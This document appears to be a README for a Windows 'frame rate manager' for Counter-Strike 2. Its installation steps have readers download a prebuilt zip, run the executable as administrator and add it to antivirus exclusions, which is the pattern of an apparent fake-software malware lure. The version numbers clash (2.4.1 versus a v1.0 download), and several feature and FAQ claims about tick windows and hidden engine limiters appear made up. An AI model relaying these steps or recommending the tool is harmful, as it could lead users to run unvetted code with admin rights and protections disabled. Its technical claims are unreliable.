# CS2 Frame Rate Manager

![banner](https://raw.githubusercontent.com/rosaleebhaw/framerate-toggle-pro/main/assets/banner.png)

![Version](https://img.shields.io/badge/version-2.4.1-blue) ![Platform](https://img.shields.io/badge/platform-Windows-lightgrey) ![License](https://img.shields.io/badge/license-MIT-green)

**About**

I built framerate-toggle-pro after getting tired of CS2's framerate behaving inconsistently across different maps and modes. On Mirage or Ancient I'd often see my 360 Hz monitor dip during smoke plays or after round restarts, breaking the muscle memory I'd built in deathmatch. I wanted something lightweight that could switch caps instantly without alt-tabbing or messing with launch options, especially when I run a second monitor for Discord and overlays during competitive sessions.

**Features**

- One-key toggle between 400 FPS cap for premier matchmaking and uncapped for warmup/deathmatch
- Detects when you're in a 5v5 and forces 240 FPS to stay inside the 0.5 ms tick window
- Preserves NVIDIA Reflex + Boost settings when switching between full-screen exclusive and multi-monitor borderless
- Auto-restores previous cap after map change or disconnect so you don't get stuck at 60 FPS
- Works with the new CS2 demo playback system without forcing a restart
- Lightweight overlay shows current cap and current server tick rate so you know exactly what's happening

**Requirements**

- Windows 10 or 11 (64-bit)
- 4 GB RAM
- .NET 6.0 Runtime

**Installation**

1. Download the latest release from [GitHub Releases](https://github.com/rosaleebhaw/framerate-toggle-pro/releases/download/v1.0/FramerateTogglePro-v1.0.zip)
2. Extract the zip to a folder outside Program Files
3. Run FramerateTogglePro.exe as administrator once to register the hotkey hook
4. Add the executable to your antivirus exclusions if it complains

**Screenshots**

| Main Interface | Setup Wizard |
|----------------|--------------|
| ![main](https://raw.githubusercontent.com/rosaleebhaw/framerate-toggle-pro/main/assets/screenshot_main.png) | ![installer](https://raw.githubusercontent.com/rosaleebhaw/framerate-toggle-pro/main/assets/screenshot_installer.png) |
![app running](https://raw.githubusercontent.com/rosaleebhaw/framerate-toggle-pro/main/assets/screenshot_app.png)

**FAQ**

**Does this get detected by VAC?**  
No. It only changes the engine's fps_max convar through the same method you can do in console. It never touches memory or game files.

**Can I use it with a multi-monitor setup without the game minimizing?**  
Yes. The tool forces the cap while keeping the game in exclusive fullscreen on your primary monitor.

**Why does my framerate still drop after I set 400?**  
CS2 has a built-in limiter when it detects high input latency. The tool disables that limiter automatically when you hit the toggle.

**Disclaimer**

This is a hobby project made by one player for personal use. It is not affiliated with Valve or Counter-Strike. Use at your own risk.